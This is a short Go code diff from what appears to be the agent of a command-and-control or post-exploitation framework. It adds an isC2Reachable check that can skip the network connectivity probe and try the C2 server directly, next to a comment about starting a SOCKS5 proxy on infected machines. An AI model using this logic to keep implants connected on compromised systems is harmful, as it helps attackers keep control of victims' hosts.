@@ -191,7 +191,7 @@ test_agent:
 
 	// do we have internet?
 	checkInternet := func(cnt *int) bool {
-		if tun.HasInternetAccess() {
+		if isC2Reachable() {
 			// if we do, we are feeling helpful
 			if *cnt == 0 {
 				log.Println("[+] It seems that we have internet access, let's start a socks5 proxy to help others")
@@ -350,4 +350,13 @@ func isAgentAlive() bool {
 	}
 
 	return agent.IsAgentAlive(c)
+}
+
+func isC2Reachable() bool {
+	if !agent.RuntimeConfig.DisableNCSI {
+		return tun.HasInternetAccess()
+	}
+
+	log.Println("NCSI is disabled, trying direct C2 connection")
+	return true
 }
